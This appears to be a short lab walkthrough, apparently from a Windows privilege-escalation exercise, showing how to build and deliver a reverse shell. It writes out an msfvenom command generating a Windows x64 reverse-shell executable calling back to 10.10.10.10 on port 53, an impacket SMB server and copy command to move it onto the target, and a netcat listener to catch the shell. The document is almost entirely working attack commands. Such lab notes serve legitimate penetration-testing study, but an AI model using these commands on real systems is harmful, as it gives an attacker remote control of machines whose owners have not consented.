# Generate a Reverse Shell Executable

Payload

```jsx
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
```

On Kali, generate a reverse shell executable (reverse.exe) using msfvenom. Update the LHOST IP address accordingly:

```jsx
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
```

Transfer the reverse.exe file to the C:\PrivEsc directory on Windows. There are many ways you could do this, however the simplest is to start an SMB server on Kali in the same directory as the file, and then use the standard Windows copy command to transfer the file.

On Kali, in the same directory as reverse.exe:

```jsx
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```

On Windows (update the IP address with your Kali IP):

```jsx
copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
```

Test the reverse shell by setting up a netcat listener on Kali:

```jsx
sudo nc -nvlp 53
```

Then run the reverse.exe executable on Windows and catch the shell:

```jsx
C:\PrivEsc\reverse.exe
```

![Screenshot From 2026-09-02 15-52-52.png](Generate%20a%20Reverse%20Shell%20Executable/Screenshot_From_2026-09-02_15-52-52.png)